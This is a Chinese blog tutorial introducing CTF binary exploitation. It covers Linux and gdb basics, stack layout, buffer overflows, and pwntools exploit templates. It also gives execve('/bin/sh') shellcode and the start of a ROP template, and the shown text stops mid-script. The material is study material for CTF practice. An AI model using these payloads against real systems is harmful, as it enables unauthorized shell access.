@@ -1,0 +1,944 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"content.json"};
+  </script>
+
+  <meta name="description" content="1. Linux入门    命令 含义 示例     pwd 输出当前路径 pwd   ls 列出位于当前路径的文件 ls -al   cd xxx 改变当前路径，前往xxx目录 cd ~&#x2F;workspace   cat xxx 直接展示xxx文件的内容 cat hw.c   * \ grep xxx *是其他命令，输出含有xxx的行 cat hw.c \ grep stdio.h   * \ l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn基础入门">
+<meta property="og:url" content="http://example.com/posts/1c971db4.html">
+<meta property="og:site_name" content="v5le0n9&#39;s garden">
+<meta property="og:description" content="1. Linux入门    命令 含义 示例     pwd 输出当前路径 pwd   ls 列出位于当前路径的文件 ls -al   cd xxx 改变当前路径，前往xxx目录 cd ~&#x2F;workspace   cat xxx 直接展示xxx文件的内容 cat hw.c   * \ grep xxx *是其他命令，输出含有xxx的行 cat hw.c \ grep stdio.h   * \ l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="f:/markdown图片/pwn知识点/汇编指令.png">
+<meta property="og:image" content="http://example.com/posts/undefined/checksec.png">
+<meta property="og:image" content="http://example.com/posts/undefined/7.2.1.png">
+<meta property="article:published_time" content="2022-04-10T06:27:13.698Z">
+<meta property="article:modified_time" content="2022-04-10T06:44:50.193Z">
+<meta property="article:author" content="v5le0n9">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="f:/markdown图片/pwn知识点/汇编指令.png">
+
+<link rel="canonical" href="http://example.com/posts/1c971db4.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn基础入门 | v5le0n9's garden</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">v5le0n9's garden</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小凉的秘密基地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/v5le0n9" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/1c971db4.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn基础入门
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-10 14:27:13 / 修改时间：14:44:50" itemprop="dateCreated datePublished" datetime="2022-04-10T14:27:13+08:00">2022-04-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">漏洞渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="1-Linux入门"><a href="#1-Linux入门" class="headerlink" title="1. Linux入门"></a>1. Linux入门</h1><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>含义</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>pwd</td>
+<td>输出当前路径</td>
+<td>pwd</td>
+</tr>
+<tr>
+<td>ls</td>
+<td>列出位于当前路径的文件</td>
+<td>ls -al</td>
+</tr>
+<tr>
+<td>cd xxx</td>
+<td>改变当前路径，前往xxx目录</td>
+<td>cd ~/workspace</td>
+</tr>
+<tr>
+<td>cat xxx</td>
+<td>直接展示xxx文件的内容</td>
+<td>cat hw.c</td>
+</tr>
+<tr>
+<td><em>*</em> \</td>
+<td>grep xxx</td>
+<td><em>*</em>是其他命令，输出含有xxx的行</td>
+<td>cat hw.c \</td>
+<td>grep stdio.h</td>
+</tr>
+<tr>
+<td><em>*</em> \</td>
+<td>less</td>
+<td>查看输出更舒服，jk上下移动q退出</td>
+<td>cat hw.c \</td>
+<td>less</td>
+</tr>
+<tr>
+<td>./xxx</td>
+<td>运行当前目录xxx可执行文件</td>
+<td>./a.out</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="2-汇编基础"><a href="#2-汇编基础" class="headerlink" title="2. 汇编基础"></a>2. 汇编基础</h1><p> 内存地址：在有段/偏移寄存器的语境下一般记为<code>段:偏移</code>，如<code>CS:IP</code>,<code>SS:IP</code>,<code>SS:BP</code>,<code>DS:DI</code>,<code>DS:SI</code>,<code>DS:[]</code></p>
+<script type="math/tex; mode=display">
+一个内存地址=段地址×16+偏移地址\\
+1234h:ABCDh=12340h+ABCDh=1CF0Dh</script><p>小端序：低地址存放低位数据</p>
+<p>一个程序的内存空间：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>高地址</th>
+<th style="text-align:center">OS Kernel Space</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td style="text-align:center">Stack</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">↓(blank)</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">Shared Libraries</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">↑(blank)</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">Heap</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">BSS</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">Data(RW)数据段</td>
+</tr>
+<tr>
+<td></td>
+<td style="text-align:center">Text(RX)代码段</td>
+</tr>
+<tr>
+<td>低地址</td>
+<td style="text-align:center">(blank)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>栈：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:center">SS:SP 栈顶</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">SS:BP 栈帧基底</td>
+</tr>
+<tr>
+<td style="text-align:center">SS 栈底</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>寄存器总结</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>name</th>
+<th>用途</th>
+<th>name</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AX</td>
+<td>通常用来存放函数的返回值</td>
+<td>SS(Stack Seg)</td>
+<td>栈的段地址/基地址</td>
+</tr>
+<tr>
+<td>CX</td>
+<td>通常用来做循环计数器</td>
+<td>CS(Code Seg)</td>
+<td>下一条指令的段地址</td>
+</tr>
+<tr>
+<td>BX</td>
+<td></td>
+<td>DS(Data Seg)</td>
+<td>数据的段地址</td>
+</tr>
+<tr>
+<td>DX</td>
+<td></td>
+<td><strong>SP(Stack Pointer)</strong></td>
+<td>栈顶偏移地址</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><strong>BP(Base Pointer)</strong></td>
+<td>栈的基址偏移地址</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td><strong>IP(Instruction Pointer)</strong></td>
+<td>下一条指令的偏移地址</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>汇编指令</p>
+<p><img src="F:\markdown图片\pwn知识点\汇编指令.png" alt="汇编指令"></p>
+<h1 id="3-程序装载与栈帧结构"><a href="#3-程序装载与栈帧结构" class="headerlink" title="3. 程序装载与栈帧结构"></a>3. 程序装载与栈帧结构</h1><p>在Linux的可执行文件ELF</p>
+<p>ELF文件类型：</p>
+<ul>
+<li>Relocatable File(*.o)：可重定位文件，用来链接的素材</li>
+<li>Executable File(*)：可执行文件</li>
+<li>Shared Object File(*.so)：共享目标文件，用于做动态链接库</li>
+</ul>
+<h1 id="4-实战环境配置和工具介绍"><a href="#4-实战环境配置和工具介绍" class="headerlink" title="4. 实战环境配置和工具介绍"></a>4. 实战环境配置和工具介绍</h1><p>连接远程服务器：</p>
+<p>nc表示netcat</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28487</span><br></pre></td></tr></table></figure>
+<p>使用file查看文件信息，checksec查看文件保护信息。</p>
+<img src="/posts/undefined/checksec.png" class="" title="文件信息">
+<p>利用gdb调试ELF文件：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>简写</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file</td>
+<td></td>
+<td>装载一个文件，可以在gdb后加参数，效果等同</td>
+</tr>
+<tr>
+<td>kill</td>
+<td></td>
+<td>终止当前调试的进程</td>
+</tr>
+<tr>
+<td>run</td>
+<td>r</td>
+<td>运行当前装载的文件，运行过程中使用Ctrl + C退出程序交互，进入调试(在退出时位置)</td>
+</tr>
+<tr>
+<td>next</td>
+<td>n</td>
+<td>=step over 单步步过</td>
+</tr>
+<tr>
+<td>step</td>
+<td>s</td>
+<td>=step into 单步步入</td>
+</tr>
+<tr>
+<td>continue</td>
+<td>c</td>
+<td>继续执行程序，直到下一个中断或程序结束</td>
+</tr>
+<tr>
+<td>finish</td>
+<td>fini</td>
+<td>运行到函数返回处</td>
+</tr>
+<tr>
+<td>catch</td>
+<td></td>
+<td>设置捕捉点</td>
+</tr>
+<tr>
+<td>thread</td>
+<td>t</td>
+<td>查看当前程序的线程信息</td>
+</tr>
+<tr>
+<td>break</td>
+<td>b</td>
+<td>在当前位置设置断点</td>
+</tr>
+<tr>
+<td>backtrace</td>
+<td>k</td>
+<td>查看当前函数调用栈信息</td>
+</tr>
+<tr>
+<td>stack</td>
+<td></td>
+<td>stack n 查看栈内容</td>
+</tr>
+<tr>
+<td>vmmap</td>
+<td></td>
+<td>查看程序中的分段，相当于OD中的<code>E</code>模块</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h1 id="5-缓冲区溢出"><a href="#5-缓冲区溢出" class="headerlink" title="5. 缓冲区溢出"></a>5. 缓冲区溢出</h1><p>编写程序时没有考虑或错误设置用户输入长度，导致用户向缓冲区输入长度超过接受变量长度，从而覆盖到其它正常数据，破坏栈帧结构。</p>
+<p>缓冲区溢出常见的漏洞函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> handle, <span class="type">void</span> *buf, <span class="type">int</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">scanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">getchar</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> format, ...)</span>;</span><br></pre></td></tr></table></figure>
+<p>如果文件中有”/bin/sh”，可用以下脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b foo&#x27;</span>)		<span class="comment">#在foo函数下断</span></span><br><span class="line">    <span class="comment"># 如果直到backdoor和binsh的地址可直接写地址</span></span><br><span class="line">    <span class="comment"># backdoor = 0x08049172</span></span><br><span class="line">    <span class="comment"># bin_sh = 0x0804A008</span></span><br><span class="line">    backdoor = e.symbols[<span class="string">&#x27;backdoor&#x27;</span>]	<span class="comment">#参数为函数名字</span></span><br><span class="line">    bin_sh = <span class="built_in">next</span>(e.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment">#在ELF文件中找/bin/sh</span></span><br><span class="line">    main_addr = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1c</span> + p32(backdoor) + p32(main_addr) + p32(bin_sh)	<span class="comment"># 即执行完backdoor函数后返回到main函数</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="6-Shellcode"><a href="#6-Shellcode" class="headerlink" title="6. Shellcode"></a>6. Shellcode</h1><p>shellcode就是能使程序调用shell的一段代码(通常为汇编级别/机器码)。一旦某种shellcode被执行，我们就能够拿到目标机器的控制权限，从而获取flag。</p>
+<ul>
+<li>system(“/bin/sh”);（？） -&gt; execve(“/bin/sh”, 0, 0)</li>
+<li>触发中断(int 0x80 / syscall)</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; first.asm</span><br><span class="line">; first get shell test in pwn class</span><br><span class="line">; nasm -f elf32 first.asm</span><br><span class="line">; ld -m elf_i386 -o getShell first.o</span><br><span class="line">; objump -d getShell</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">	push &quot;/sh&quot;</span><br><span class="line">	push &quot;/bin&quot;</span><br><span class="line">	mov ebx, esp</span><br><span class="line">	xor edx, edx</span><br><span class="line">	xor ecx, ecx</span><br><span class="line">	mov al, 0xb</span><br><span class="line">	int 0x80</span><br></pre></td></tr></table></figure>
+<p>Shellcode脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">    payload1 = asm(shellcraft.sh())</span><br><span class="line">    My_Shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx, 0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload2 = asm(My_Shellcode)</span><br><span class="line">    p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">    <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 25266)</span></span><br><span class="line">    <span class="comment"># p.sendline(payload1)</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="7-ROP链构造"><a href="#7-ROP链构造" class="headerlink" title="7. ROP链构造"></a>7. ROP链构造</h1><p>NX——NO Execute bit(禁止执行位)是应用在CPU上的安全技术，它支持了操作系统级别的DEP——Data Execute Prevention(数据执行保护，Microsoft)。在应用了NX的系统上，(如果可执行文件开启保护)，会把内存中的区域分为只供存储指令和只供存储数据两种。NX bit 被标记在内存分页中使用的页表索引上，如果置1，则该页内存数据不允许被执行，即把所有内容作为数据处理。这样可以防范shellcode注入攻击。</p>
+<p>ROP——Return-Oriented Programming(返回导向编程)技术，允许攻击者在开启了栈不可执行等安全保护技术的情况下，执行恶意代码。</p>
+<p>核心思想是通过栈溢出等方式，改写栈上的控制信息(调用栈，即return address, rbp等)，以控制调用栈，劫持程序控制流并执行一些针对性的命令序列(gadgets)。</p>
+<p>gadgets主要指一些以ret结尾的小段汇编指令，它们的执行通过ret语句和栈上控制的返回地址相连，构成一条ROP链。链的功能是设置寄存器值，泄露信息，调用函数等。</p>
+<h2 id="7-1-Ret2Text"><a href="#7-1-Ret2Text" class="headerlink" title="7.1 Ret2Text"></a>7.1 Ret2Text</h2><p>gadget一般存在于Text中，或者广义上存在于ELF文件中(指令部分)。将返回地址改写为能执行某些特定功能的gadget地址，构造ROP链。</p>
+<p>辅助工具：ropper、pwntools(ELF class)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span 